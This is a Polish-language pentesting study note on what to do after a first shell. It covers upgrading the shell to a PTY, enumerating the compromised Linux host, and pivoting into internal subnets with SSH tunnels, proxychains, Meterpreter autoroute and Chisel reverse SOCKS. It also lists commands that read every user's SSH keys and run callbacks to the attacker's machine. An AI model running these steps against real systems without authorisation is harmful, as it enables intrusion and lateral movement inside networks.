---
id: network-infrastructure-pivoting-port-forwarding-host-enumeration
title: "Pivoting, port forwarding i analiza przejętego hosta: jak ruszyć dalej po pierwszym dostępie"
team: red-blue
domain: network-infrastructure
section: post-exploitation
type: knowledge
angle: from-first-shell-to-internal-network-access
sourceTrack: netMaster
tags:
  [
    "pivoting",
    "port-forwarding",
    "tunneling",
    "ssh",
    "proxychains",
    "meterpreter",
    "chisel",
    "post-exploitation",
    "linux",
    "network-recon",
    "internal-network",
    "tty",
    "c2",
  ]
difficulty: medium
shortDescription: "Notatka o tym, co zrobić po uzyskaniu pierwszej powłoki: jak ustabilizować shell, zebrać informacje o hoście, zrozumieć jego pozycję w sieci i wykorzystać go jako punkt wejścia do dalszych segmentów infrastruktury."
updatedAt: "2026-05-13"
---

# Pivoting, port forwarding i analiza przejętego hosta

Pierwszy shell bardzo łatwo traktować jak finał ataku.

Jest dostęp.  
Jest terminal.  
Można wpisać `whoami`.  
Niby sukces.

Tylko że w prawdziwym pentestingu infrastruktury pierwszy shell najczęściej nie jest końcem. Jest dopiero początkiem pracy.

Bo od tego momentu zaczyna się dużo ważniejsze pytanie:

> Skoro już jestem na tym hoście, to co ten host widzi, czego ja wcześniej nie widziałem?

To jest cała różnica między “mam shella” a “rozumiem, gdzie jestem w sieci”.

Dobry operator nie zatrzymuje się na samym dostępie. Najpierw stabilizuje powłokę, później rozpoznaje lokalny system, sprawdza interfejsy, trasy, procesy, usługi, konfiguracje i dopiero wtedy decyduje, czy host może zostać użyty jako most do dalszej części środowiska.

Bo czasem najważniejszą podatnością nie jest exploit, który dał wejście.

Czasem najważniejszy jest fakt, że przejęty host ma drugi interfejs sieciowy i widzi segment, do którego z zewnątrz nie było żadnej drogi.

---

## Najpierw powłoka, która nadaje się do pracy

Po prostym reverse shellu bardzo często dostajemy coś, co technicznie działa, ale praktycznie jest niewygodne.

Nie działają strzałki.  
`Ctrl+C` może zerwać połączenie.  
Nie ma normalnego job control.  
Interaktywne programy zachowują się dziwnie.  
Czasem pojawia się komunikat:

```bash
bash: cannot set terminal process group
bash: no job control in this shell
```

To nie znaczy, że bash jest uszkodzony.

To znaczy, że powłoka działa na surowym gnieździe TCP, a nie na pseudoterminalu. Brakuje PTY, czyli warstwy, która daje normalne zachowanie terminala: obsługę znaków specjalnych, `Ctrl+C`, `Ctrl+Z`, `fg`, `bg`, echo, tryb linii i poprawną interakcję z programami.

Dlatego przed dalszą pracą warto zrobić upgrade shella.

```bash
/bin/bash -i
```

Jeżeli na hoście jest Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Albo starszy wariant:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Czasem przydaje się też:

```bash
script /dev/null -c bash
```

Po stronie własnej maszyny można jeszcze dopiąć terminal:

```bash
stty raw -echo; fg
```

A po powrocie do shella:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

To nie jest kosmetyka. To jest przygotowanie stanowiska pracy.

Jeżeli shell jest niestabilny, to każda kolejna czynność jest bardziej ryzykowna. Łatwiej zerwać sesję, źle wkleić komendę, nie zauważyć błędu albo zablokować się na narzędziu, które wymaga prawdziwego terminala.

---

## Pierwsze pytanie: kim jestem i gdzie jestem?

Po ustabilizowaniu powłoki nie zaczynamy od przypadkowego odpalania exploitów.

Najpierw trzeba zrozumieć kontekst.

```bash
whoami
id
hostname
pwd
```

Te kilka prostych komend mówi bardzo dużo.

Pokazują, jakim użytkownikiem działamy, w jakich grupach jesteśmy, na jakiej maszynie siedzimy i w którym miejscu systemu aktualnie się znajdujemy.

Dalej warto sprawdzić system:

```bash
uname -a
cat /etc/os-release
cat /proc/version
hostnamectl
```

Na tym etapie interesuje nas nie tylko nazwa dystrybucji. Interesuje nas wersja jądra, architektura, środowisko uruchomieniowe, ewentualne ślady konteneryzacji i wszystko, co może później wpłynąć na eskalację uprawnień albo wybór narzędzi.

Potem sprawdzamy użytkowników:

```bash
cat /etc/passwd
```

Nie po to, żeby bezmyślnie czytać każdy wpis. Szukamy realnych użytkowników, kont serwisowych, nietypowych katalogów domowych i powłok logowania. To często daje pierwsze wskazówki, kto korzysta z maszyny i jaką rolę pełni ona w środowisku.

---

## Host zaczyna opowiadać historię

Przejęty system zwykle ma na sobie ślady pracy administratorów, aplikacji i innych usług. Trzeba nauczyć się je czytać.

Historia logowań:

```bash
last -a | head -n 20
```

Aktywność SSH:

```bash
journalctl _COMM=sshd -n 50 --no-pager
```

Procesy:

```bash
ps -eo user,pid,ppid,cmd --sort=user
```

To są dane, które pomagają odpowiedzieć na pytania:

Czy to jest host aplikacyjny?
Czy działa tu baza danych?
Czy są jakieś procesy developerskie?
Czy są usługi wystawione tylko lokalnie?
Czy ktoś logował się tu z innych maszyn?
Czy w argumentach procesów widać ścieżki do konfiguracji?

Czasem wystarczy lista procesów, żeby zauważyć coś dużo ważniejszego niż sam exploit wejściowy. Na przykład usługę nasłuchującą tylko na `127.0.0.1`, panel administracyjny, lokalną bazę albo worker aplikacji, który używa konkretnego pliku konfiguracyjnego.

---

## Sprawdzenie narzędzi to nie formalność

Na przejętym hoście nie zakładamy, że mamy komfortowe środowisko.

Sprawdzamy, co już jest dostępne:

```bash
which nmap nc ncat netcat wget curl ping gcc g++ make gdb base64 socat python python2 python3 perl php ruby sudo doas docker lxc kubectl 2>/dev/null
```

To od razu mówi, jak możemy pracować.

Jeżeli jest `curl` albo `wget`, możemy pobierać pliki.
Jeżeli jest Python, możemy uruchamiać proste skrypty albo poprawić shella.
Jeżeli jest `socat`, mamy mocne narzędzie do przekierowań.
Jeżeli jest `gcc`, być może da się coś skompilować lokalnie.
Jeżeli jest `docker`, `lxc` albo `kubectl`, host może mieć znacznie ciekawszy kontekst niż zwykła maszyna Linux.

W labie czasem najprościej jest coś doinstalować. W realnym podejściu lepiej najpierw zapytać:

> Czy naprawdę muszę zmieniać system, czy mogę zrobić to z zewnątrz przez tunel?

To jest różnica między klikaniem komend a pracą z minimalną ingerencją.

---

## SSH mówi dużo o relacjach między hostami

Jednym z najbardziej wartościowych miejsc są katalogi `.ssh`.

```bash
for user in $(cut -d: -f1 /etc/passwd); do
  home=$(eval echo ~$user)
  if [ -d "$home/.ssh" ]; then
    echo "--- $user ($home/.ssh) ---"
    ls -la "$home/.ssh"
    if [ -f "$home/.ssh/authorized_keys" ]; then
      echo "authorized_keys for $user:"
      cat "$home/.ssh/authorized_keys"
    fi
  fi
done
```

Nie chodzi tylko o szukanie klucza prywatnego.

Oczywiście, klucz prywatny może być krytyczny. Ale czasami równie ważne są:

```text
authorized_keys
known_hosts
config
historia połączeń
nazwy hostów
adresy IP
nietypowe uprawnienia
```

SSH bardzo często pokazuje relacje w infrastrukturze. Jeżeli użytkownik z tego hosta łączył się do innych maszyn, to mamy potencjalny kierunek dalszej analizy.

To jest jeden z momentów, w których host zaczyna odpowiadać na pytanie:

> gdzie mogę pójść dalej?

---

## Najważniejszy etap: pozycja hosta w sieci

Po pierwszym dostępie najważniejsze nie jest to, czy możemy odpalić kolejne narzędzie.

Najważniejsze jest to, czy host ma dostęp do sieci, której my nie widzieliśmy z zewnątrz.

Dlatego sprawdzamy interfejsy:

```bash
ip a
ip -brief address show
ifconfig -a
```

Trasy:

```bash
ip route show
ip -6 route show
ip rule show
ip route show table all
```

Sąsiadów sieciowych:

```bash
ip neighbor show
arp -a
```

DNS:

```bash
cat /etc/resolv.conf
```

Nasłuchujące usługi:

```bash
ss -tulnp
netstat -tulnp
```

Firewall:

```bash
iptables -L -n -v
```

To jest punkt, w którym może się okazać, że host ma więcej niż jeden interfejs.

Przykład:

```text
eth0 -> 10.10.10.6/24
eth1 -> 172.16.2.10/24
```

Z naszej maszyny widzieliśmy tylko `10.10.10.0/24`.

Ale przejęty host widzi również `172.16.2.0/24`.

I to jest właśnie moment, w którym zwykły post-exploitation zaczyna zmieniać się w pivoting.

---

## Pivoting to nie magia, tylko routing

Pivoting brzmi jak zaawansowana technika, ale mentalnie jest prosty.

Moja maszyna nie ma dostępu do sieci wewnętrznej.
Przejęty host ma dostęp do sieci wewnętrznej.
Więc muszę przepuścić mój ruch przez przejęty host.

Tyle.

Nie zaczynamy od pytania “jakiego narzędzia użyć?”.

Najpierw pytamy:

> Co widzę ja?

```bash
ip route
```

> Co widzi host, na którym jestem?

```bash
ip a
ip route
ip neighbor
```

> Jakim kanałem mogę przepuścić ruch?

Dopiero potem wybieramy technikę: SSH, proxychains, local port forwarding, remote port forwarding, Meterpreter, Chisel albo inny tunel.

---

## Dynamiczny tunel SSH i proxychains

Jeżeli mamy dostęp SSH do hosta, jedną z najwygodniejszych opcji jest dynamiczny tunel SOCKS.

```bash
ssh -D 1080 user@10.10.10.6
```

To tworzy lokalny SOCKS proxy na porcie `1080`.

W konfiguracji `proxychains` dodajemy:

```text
socks5 127.0.0.1 1080
```

Potem możemy puścić ruch narzędzi przez ten tunel:

```bash
proxychains nmap -sT 172.16.2.0/24 --open
```

Warto pamiętać o `-sT`.

Przy proxychains zwykle używamy pełnego połączenia TCP, bo SOCKS proxy nie obsługuje surowych pakietów tak jak klasyczny SYN scan.

Ten sam tunel można wykorzystać z Burp Suite. W ustawieniach Burpa wystarczy wskazać SOCKS proxy:

```text
Host: 127.0.0.1
Port: 1080
Use SOCKS proxy: enabled
```

Od tej chwili przeglądarka spięta z Burpem może otwierać aplikacje dostępne z perspektywy jumpboxa.

To jest bardzo praktyczne przy testowaniu paneli administracyjnych, aplikacji developerskich i usług, które nigdy nie były wystawione publicznie, ale są dostępne z wewnętrznego segmentu.

---

## Local port forwarding, czyli “chcę zobaczyć zdalną usługę u siebie”

Local port forwarding przydaje się wtedy, gdy chcemy wystawić sobie lokalny port, który prowadzi do usługi dostępnej z perspektywy hosta zdalnego.

Schemat jest prosty:

```text
mój localhost -> tunel SSH -> usługa w sieci zdalnej
```

Jeżeli na zdalnym hoście działa usługa tylko na localhost:

```bash
ssh -L 8080:127.0.0.1:80 user@192.168.1.2
```

Po wejściu lokalnie na:

```text
http://127.0.0.1:8080
```

zobaczymy usługę działającą na zdalnym hoście pod `127.0.0.1:80`.

Jeżeli usługa działa na innym hoście w sieci jumpboxa:

```bash
ssh -L 8080:192.168.1.5:80 user@192.168.1.2
```

Wtedy nasz lokalny port `8080` prowadzi do `192.168.1.5:80`, ale przez `192.168.1.2`.

To jest idealne, gdy chcemy używać lokalnych narzędzi GUI: przeglądarki, Burpa, klienta bazy danych, klienta Redis albo narzędzi do testowania API.

---

## Remote port forwarding, czyli “chcę, żeby zdalny host sięgnął do mnie”

Remote port forwarding działa w drugą stronę.

```text
port na zdalnym hoście -> tunel SSH -> usługa na mojej maszynie
```

Przykład:

```bash
ssh -R 9000:127.0.0.1:8000 user@192.168.1.2
```

To oznacza, że port `9000` po stronie zdalnej będzie prowadził do `127.0.0.1:8000` na naszej maszynie.

Najprostsze rozróżnienie:

```text
Local forwarding:
mój lokalny port prowadzi do zdalnej usługi.

Remote forwarding:
zdalny port prowadzi do mojej lokalnej usługi.
```

Jeżeli tunel nie działa, najczęściej problemem nie jest SSH. Problemem jest źle zrozumiany kierunek ruchu.

Wtedy trzeba rozpisać sobie na kartce:

```text
Gdzie jest usługa?
Kto ma ją widzieć?
Na którym hoście ma nasłuchiwać port?
Z której strony inicjowane jest połączenie SSH?
```

To rozwiązuje większość problemów z tunelowaniem.

---

## SSH multi-hop

Czasami jeden jumpbox nie wystarczy.

Mamy na przykład taki układ:

```text
Kali -> victim1 -> victim2 -> sieć wewnętrzna
```

Wtedy można użyć `ProxyJump`:

```bash
ssh -J user@192.168.1.100 user@10.0.0.100 -D 1080
```

To zestawia połączenie przez `victim1` do `victim2`, a na naszej maszynie tworzy SOCKS proxy na porcie `1080`.

Potem można pracować przez proxychains:

```bash
proxychains curl http://172.16.0.100
```

Albo skanować segment dostępny z dalszego hosta:

```bash
proxychains nmap -sT 172.16.0.0/24 --open
```

Przy większej liczbie tuneli warto uporządkować SSH przez `~/.ssh/config`.

```bash
touch ~/.ssh/config
chmod 600 ~/.ssh/config
```

Przykładowy profil:

```text
Host victim1
  HostName 192.168.1.100
  User user

Host victim2
  HostName 10.0.0.100
  User user
  ProxyJump victim1
  LocalForward 8080 172.16.0.100:80
```

Od teraz wystarczy:

```bash
ssh victim2
```

To zmniejsza chaos i ryzyko pomylenia portów, hostów albo kierunku tunelu.

---

## Meterpreter jako narzędzie do pivotingu

Jeżeli nie mamy SSH, ale mamy sesję Meterpreter, nadal możemy tunelować ruch.

Meterpreter pozwala robić port forwarding:

```text
meterpreter > portfwd add -l 6379 -p 6379 -r 10.0.0.49
```

Wtedy lokalny port `6379` na Kali prowadzi do `10.0.0.49:6379` przez hosta z sesją Meterpreter.

Możemy też dodać trasę do sieci wewnętrznej:

```text
meterpreter > run autoroute -s 10.0.0.0/24
```

Albo:

```text
meterpreter > route add 10.0.0.0 255.255.255.0
```

Po tym moduły Metasploita mogą działać wobec hostów w tej podsieci:

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 80,443,6379
set THREADS 50
run
```

Można też zestawić SOCKS proxy w Metasploicie:

```text
use auxiliary/server/socks4a
set SRVPORT 1080
run
```

A potem w `proxychains`:

```text
socks4 127.0.0.1 1080
```

Meterpreter nie jest więc tylko wygodniejszym shellem. Może pełnić rolę punktu routingu do sieci, której nie widzimy bezpośrednio z Kali.

---

## Chisel, kiedy nie ma wygodnego SSH

Nie zawsze mamy SSH.

Czasami mamy tylko możliwość uruchomienia binarki na hoście. Wtedy przydaje się Chisel, czyli narzędzie do tunelowania ruchu przez HTTP/HTTPS.

Typowy reverse SOCKS wygląda tak.

Na Kali:

```bash
./chisel server -p 8000 --reverse
```

Na hoście:

```bash
./chisel client http://192.168.1.1:8000 R:socks
```

Dalej konfigurujemy `proxychains` i pracujemy podobnie jak przy tunelu SOCKS przez SSH.

Chisel potrafi też przekierować konkretną usługę:

```bash
./chisel client http://192.168.1.1:8000 R:9000:10.0.0.49:6379
```

Efekt:

```text
Kali:9000 -> 10.0.0.49:6379 z perspektywy hosta
```

Można go uruchomić również z TLS:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=tunnel.lab"
```

```bash
./chisel server --reverse -p 443 --tls --key key.pem --cert cert.pem
```

```bash
./chisel client https://192.168.1.1:443 R:9000:10.0.0.49:6379
```

Przy self-signed certificate może być potrzebne:

```bash
./chisel client https://192.168.1.1:443 --insecure R:9000:10.0.0.49:6379
```

Chisel jest bardzo praktyczny w labach, bo dobrze pokazuje jedną rzecz: tunelowanie nie jest przywiązane do SSH. Ważny jest kanał, przez który możemy przenieść ruch.

---

## Pasywna analiza ruchu

Nie zawsze trzeba zaczynać od aktywnego skanowania.

Czasami lepiej przez chwilę posłuchać, co host już robi.

DNS:

```bash
sudo tcpdump -i eth0 port 53
```

HTTP:

```bash
sudo tcpdump -i eth0 -A port 80 | grep -Ei "User-Agent|Server|Host:"
```

DHCP:

```bash
sudo tcpdump -i eth0 'port 67 or port 68' -vvv -n
```

Pasywne rozpoznawanie systemów:

```bash
sudo p0f -i eth0
```

Taka analiza może ujawnić wewnętrzne domeny, nazwy hostów, serwery DNS, komunikację aplikacji, zależności między usługami albo systemy, które same regularnie kontaktują się z przejętym hostem.

To jest mniej widowiskowe niż skanowanie całej podsieci, ale często daje lepszy kontekst.

---

## Tunelowanie przez inne protokoły

Czasami klasyczne połączenia są blokowane.

Reverse shell na losowy port nie wychodzi.
SSH nie działa.
Ruch jest filtrowany.
Sieć wypuszcza tylko wybrane protokoły.

Wtedy pojawia się temat tunelowania przez kanały, które są dozwolone.

Przykładowo DNS tunneling przenosi ruch przez zapytania DNS. Narzędziem do tego może być `iodine`.

ICMP tunneling przenosi ruch przez ICMP. Przykładem może być `ptunnel-ng`.

Nie chodzi o to, żeby zapamiętać każde narzędzie.

Chodzi o zrozumienie zasady:

> jeżeli nie mogę wejść bezpośrednio, sprawdzam, co może wychodzić z hosta i przez jaki kanał da się przenieść ruch.

To jest ten sam sposób myślenia, który później prowadzi do zrozumienia Command and Control.

---

## Wprowadzenie do Command and Control

Prosty reverse shell to pojedynczy kanał dostępu.

Command and Control to już sposób zarządzania operacją.

C2 pozwala zwykle pracować z wieloma sesjami, implantami, kanałami komunikacji, zadaniami, trasami i mechanizmami tunelowania.

W labowym świecie często zaczynamy od:

```text
nc -lvnp 4444
```

Ale w bardziej operatorskim podejściu zaczynamy myśleć o tym, jak zarządzać dostępem, jak utrzymać komunikację, jak przepuszczać ruch i jak kontrolować wiele hostów bez chaosu.

Przykładem takiego frameworka jest Sliver, który w materiale pojawia się jako przykład narzędzia C2.

Najważniejsza różnica mentalna jest prosta:

```text
Shell daje dostęp do jednego hosta.

C2 daje strukturę do prowadzenia operacji.
```

I nawet jeśli w labach nie budujemy pełnej infrastruktury C2, warto rozumieć ten kierunek. Bo tunelowanie, pivoting, port forwarding i zarządzanie sesjami to fundament tego samego sposobu myślenia.

---

## Praktyczny workflow po pierwszym dostępie

Po zdobyciu shella nie skacz od razu do exploitów.

Najpierw popraw terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Potem sprawdź, kim jesteś:

```bash
whoami
id
hostname
```

Zrozum system:

```bash
uname -a
cat /etc/os-release
```

Zobacz, jakie masz narzędzia:

```bash
which nc ncat netcat wget curl python3 ssh socat nmap gcc make 2>/dev/null
```

Sprawdź sieć:

```bash
ip -brief address show
ip route show
ip neighbor show
ss -tulnp
cat /etc/resolv.conf
```

Jeżeli host widzi dodatkową podsieć, wybierz sposób pivotingu.

SSH SOCKS:

```bash
ssh -D 1080 user@jumpbox
```

Proxychains:

```bash
proxychains nmap -sT 172.16.2.0/24 --open
```

Local port forwarding do konkretnej usługi:

```bash
ssh -L 8080:internal-host:80 user@jumpbox
```

Chisel, gdy nie masz SSH:

```bash
./chisel server -p 8000 --reverse
```

```bash
./chisel client http://kali-ip:8000 R:socks
```

Meterpreter, gdy pracujesz przez Metasploita:

```text
meterpreter > run autoroute -s 10.0.0.0/24
```

---

## Typowy błąd: komendy bez modelu mentalnego

Największy problem przy pivotingu nie polega na tym, że ktoś nie zna składni `ssh -L` albo `ssh -R`.

Problem polega na tym, że nie rozumie kierunku ruchu.

Dlatego przed każdą komendą warto odpowiedzieć sobie na cztery pytania:

```text
Gdzie jestem?
Co widzi przejęty host?
Do jakiej usługi chcę się dostać?
Którędy ma płynąć ruch?
```

Dopiero potem wybierasz narzędzie.

Wtedy `ssh -D`, `ssh -L`, `ssh -R`, `autoroute`, `portfwd`, `chisel` i `proxychains` przestają być losowymi komendami z cheatsheeta.

Zaczynają być różnymi odpowiedziami na ten sam problem:

> mam dostęp do jednego miejsca w sieci i chcę kontrolowanie zobaczyć, co znajduje się dalej.

---

## Co warto zapamiętać

Pierwszy shell to nie finał.

To punkt obserwacyjny.

Z tego punktu trzeba zrozumieć hosta, jego rolę, procesy, użytkowników, interfejsy, trasy i sąsiednie systemy. Dopiero wtedy można uczciwie powiedzieć, jaki był realny zasięg dostępu.

W pentestingu infrastruktury exploit daje wejście.

Ale dopiero enumeracja, routing i pivoting pokazują, czy to wejście prowadziło tylko do jednej maszyny, czy do całego fragmentu środowiska.

Najważniejsza lekcja z tego etapu jest prosta:

> Nie ucz się pivotingu jako listy komend. Ucz się go jako sposobu myślenia o ruchu w sieci.
